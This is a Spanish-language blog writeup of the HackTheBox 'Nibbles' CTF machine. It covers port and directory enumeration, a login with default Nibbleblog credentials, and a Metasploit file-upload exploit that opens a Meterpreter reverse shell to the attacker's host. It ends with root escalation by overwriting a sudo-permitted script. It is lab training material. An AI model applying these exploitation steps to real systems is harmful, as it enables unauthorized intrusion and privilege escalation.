---
title: "Writeup [Nibbles] - HackTheBox"
date: 2024-06-25 10:00:00 +0200
categories: [CTF, Writeups, HackTheBox, Linux, Principiante]
tags: [CTF, Writeups, HackTheBox, Linux, Principiante]
image: /img/posts/CTF/Nibbles/nibbles.png
---


## Introducción

Hoy vamos a realizar el desafío de la máquina CTF llamada NIBBLES en HackTheBox. Este es un reto de nivel principiante que opera bajo un sistema Linux.

### Escaneo de Puertos Inicial

Comenzamos el análisis con un escaneo de puertos utilizando `nmap` para identificar puertos abiertos y servicios activos en la máquina.

```bash
❯ nmap -sS -p- --open --min-rate 5000 -vvv -n 10.10.10.75 -oG allports
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 19:30 CEST
Initiating Ping Scan at 19:30
Scanning 10.10.10.75 [4 ports]
Completed Ping Scan at 19:30, 0.36s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:30
Scanning 10.10.10.75 [65535 ports]
Discovered open port 80/tcp on 10.10.10.75
Discovered open port 22/tcp on 10.10.10.75
Completed SYN Stealth Scan at 19:30, 14.89s elapsed (65535 total ports)
Nmap scan report for 10.10.10.75
Host is up, received echo-reply ttl 63 (0.33s latency).
Scanned at 2024-06-23 19:30:16 CEST for 15s
Not shown: 65527 closed tcp ports (reset), 6 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

### Análisis Detallado de los Servicios
Con los puertos identificados, procedemos a un análisis más profundo utilizando nmap con scripts de enumeración para obtener más información sobre los servicios expuestos.
```bash
❯ nmap -sCV -p80,22 10.10.10.75 -oG ports
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 19:34 CEST
Nmap scan report for 10.10.10.75
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```


### Recolección de Metadatos Web
Para comprender mejor el entorno web, utilizamos whatweb para analizar el encabezado HTTP y otros metadatos del sitio alojado en el puerto 80.

```bash
❯ whatweb 10.10.10.75 > whatweb
http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```

### Conclusión
Hasta ahora, hemos establecido la infraestructura básica y los servicios críticos de la máquina NIBBLES. En las siguientes secciones de este writeup, exploraremos cómo podemos explotar estos servicios para obtener un mayor acceso a la máquina.

## Investigación de Vulnerabilidades y Exploración de Puertos

Ahora que hemos identificado los puertos y servicios activos en NIBBLES, pasaremos a investigar posibles vulnerabilidades, centrándonos inicialmente en el servidor web Apache en el puerto 80.

### Exploración de Directorios con Gobuster

Dado que no tenemos credenciales para probar el acceso SSH, nuestra atención se dirige hacia el servidor Apache. Ejecutamos `Gobuster` para explorar directorios y archivos en el servidor web. Utilizamos una lista de palabras conocida y buscamos archivos con las extensiones `.html` y `.php`. Aquí están los detalles y resultados del comando ejecutado:

```plaintext
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
Url:            http://10.10.10.75
Method:         GET
Threads:        10
Wordlist:       /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
Negative Status codes: 404
User Agent:     Gobuster/3.6
Extensions:     html,php
Expanded:       true
Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.75/.html           (Status: 403) (Size: 291)
http://10.10.10.75/.php            (Status: 403) (Size: 290)
http://10.10.10.75/index.html      (Status: 200) (Size: 93)
===============================================================
```


### Análisis de los Resultados de Gobuster

Este resultado nos muestra que:

- **Accesos bloqueados**: Los intentos de acceso a archivos o directorios con las extensiones `.html` y `.php` resultaron en un estado `403 Forbidden`. Esto indica que tales accesos están bloqueados, lo cual puede sugerir restricciones de seguridad implementadas en el servidor.

- **Archivo accesible**: El archivo `index.html` es accesible y devuelve un estado `200 OK`. Esto significa que este archivo está disponible y podría ser un buen punto de partida para una exploración más detallada del contenido y funcionalidades del servidor.


### Exploración del Archivo index.html

El archivo `index.html` al que accedimos inicialmente solo muestra un simple mensaje de "Hola mundo". 

![Imagen del mensaje 'Hola mundo' en index.html](</img/posts/CTF/Nibbles/helloworld.png>) 

Sin embargo, al inspeccionar el código fuente del HTML, descubrimos un comentario que indica la existencia de un directorio potencialmente interesante:

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/Nibbles/source.png>) 


## Descubrimiento y Exploración de Nibbleblog

Al acceder al directorio sugerido por el comentario en el código HTML, confirmamos su existencia:

http://10.10.10.75/nibbleblog/


Nos encontramos con una interfaz que parece ser un blog. Mirando más de cerca el pie de página, observamos un detalle interesante:

**"Powered by Nibbleblog"**

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/Nibbles/footer.png>) 

### Investigación sobre Nibbleblog

Tras investigar, descubrimos que Nibbleblog es un sistema de gestión de contenidos (CMS) que permite crear blogs sin la necesidad de una base de datos. Este detalle es crucial, ya que las versiones y configuraciones predeterminadas de tales sistemas pueden contener vulnerabilidades conocidas.

### Escaneo del Directorio Nibbleblog

Decidimos profundizar en la estructura del directorio utilizando `feroxbuster`, una herramienta para la enumeración rápida de archivos y directorios:

```bash
feroxbuster --url http://10.10.10.75/nibbleblog/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php
```

### Hallazgos Interesantes
Entre los archivos encontrados, uno en particular capta nuestra atención:

- **users.xml**: Este archivo contiene un usuario llamado admin, lo que podría ser un vector de ataque potencial.
También identificamos dos archivos que indican una instalación probablemente estándar y sin modificaciones posteriores:

- **install.php**
- **update.php**


Estos archivos son accesibles públicamente y podrían proporcionar pistas sobre la configuración o incluso métodos para explotar el sistema. Buscando en la guia oficial, localizamos el login por defecto **admin:nibbles**


## Explotación de Vulnerabilidades en Nibbleblog

Ahora que hemos identificado varios vectores potenciales de ataque, procedemos a explotar las vulnerabilidades del sistema Nibbleblog utilizando la herramienta `Metasploit`.

### Configuración de Metasploit

Primero, iniciamos `msfconsole` y buscamos un exploit apropiado para Nibbleblog. 

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/Nibbles/msfc.png>) 

Una vez seleccionado el exploit, revisamos y configuramos las opciones necesarias para ejecutarlo adecuadamente.

### Ejecución del Exploit

A continuación, se muestra la configuración del exploit `nibbleblog_file_upload` y el lanzamiento del ataque:

```bash
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> use 0
[*] Using configured payload php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> show options

# Aquí se mostrarían las opciones del módulo y las opciones de la carga útil.

[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set password nibbles
password => nibbles
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set username admin
username => admin
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set targeturi /nibbleblog/
targeturi => /nibbleblog/
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set rhosts 10.10.10.75
rhosts => 10.10.10.75
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set LHOST 10.10.14.19
LHOST => 10.10.14.19
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> run

[*] Started reverse TCP handler on 10.10.14.19:443 
[*] Sending stage (39927 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.19:443 -> 10.10.10.75:53786) at 2024-06-24 07:45:35 +0200
```

## Obtención de Acceso al Shell y Descubrimiento de Flags

Una vez establecida la sesión de Meterpreter, procedimos a obtener un shell interactivo para explorar el sistema con más profundidad.

### Iniciando un Shell Interactivo

Para hacer la interacción con el sistema más fácil, mejoramos el shell utilizando Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Después de obtener el shell, verificamos nuestra ubicación actual y exploramos los directorios:

```bash
(Meterpreter 1)(/var/www/html/nibbleblog/content/private/plugins/my_image) > shell
Process 40368 created.
Channel 0 created.
pwd
/var/www/html/nibbleblog/content/private/plugins/my_image
```


### Descubrimiento del Primer Flag: User.txt
Navegamos por el sistema de archivos para encontrar cualquier información sensible o flags. Encontramos el primer flag en el directorio del usuario nibbler:

```bash

nibbler@Nibbles:/home$ cd nibbler
cd nibbler
nibbler@Nibbles:/home/nibbler$ ls
ls
personal  personal.zip	user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
b56***********
```





## Escalada de Privilegios para Acceso Root

Con la sesión de shell en nuestro poder, procedimos a identificar cualquier oportunidad para escalar nuestros privilegios dentro del sistema.

### Identificación de Oportunidades con `sudo -l`

Primero, utilizamos el comando `sudo -l` para ver qué comandos puede ejecutar el usuario *nibbler* con privilegios de root sin necesidad de contraseña:

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Este resultado muestra que podemos ejecutar el script monitor.sh ubicado en el directorio personal del usuario nibbler con privilegios de root y sin contraseña.

Modificación y Ejecución del Script
Para explotar esta configuración, modificamos el contenido del script monitor.sh para ejecutar una shell con privilegios de root:

```bash
nibbler@Nibbles:/home/nibbler$ echo -e '#!/bin/bash\nwhoami' > /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ chmod +x /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
root
```
Al ejecutar el script modificado, confirmamos que nuestro usuario ha escalado a root, como se muestra en la salida del comando whoami.

Captura de la Bandera Root
Finalmente, con los privilegios de root asegurados, procedimos a capturar la bandera final localizada en el directorio de root:

```bash
root@Nibbles:/home/nibbler# cat /root/root.txt
cat /root/root.txt
766********************
```


Este paso marca la conclusión exitosa del desafío, habiendo obtenido tanto el acceso como las banderas de usuario y root.


## Conclusiones

En este writeup, hemos explorado detalladamente cómo abordar la máquina NIBBLES en HackTheBox, desde la identificación inicial hasta la escalada de privilegios para obtener acceso root. A continuación, se resumen las herramientas y metodologías clave utilizadas, así como la relevancia de estas habilidades para certificaciones profesionales en seguridad informática.

### Herramientas Utilizadas

- **Nmap**: Utilizado para la identificación de puertos abiertos y servicios.
- **Gobuster** y **feroxbuster**: Herramientas de fuerza bruta para la enumeración de directorios y archivos.
- **Metasploit**: Usado para explotar vulnerabilidades específicas y obtener acceso al sistema.
- **Python**: Empleado para mejorar la interacción con el shell obtenido.

### Metodologías Aplicadas

El proceso de prueba de penetración siguió una metodología estructurada que incluyó:
- **Reconocimiento**: Identificación de puertos y servicios.
- **Enumeración**: Detallar los servicios y buscar configuraciones por defecto o vulnerables.
- **Explotación**: Uso de exploits conocidos para ganar acceso al sistema.
- **Post-explotación**: Escalada de privilegios y captura de banderas (flags).


### Despedida

¡Gracias por seguir este Writeup! Espero que hayas encontrado útiles los métodos y técnicas compartidos. No dudes en utilizar este conocimiento en tus propios retos de seguridad y únete a nosotros en el próximo desafío, donde continuaremos explorando y aprendiendo juntos. ¡Hasta el próximo reto!

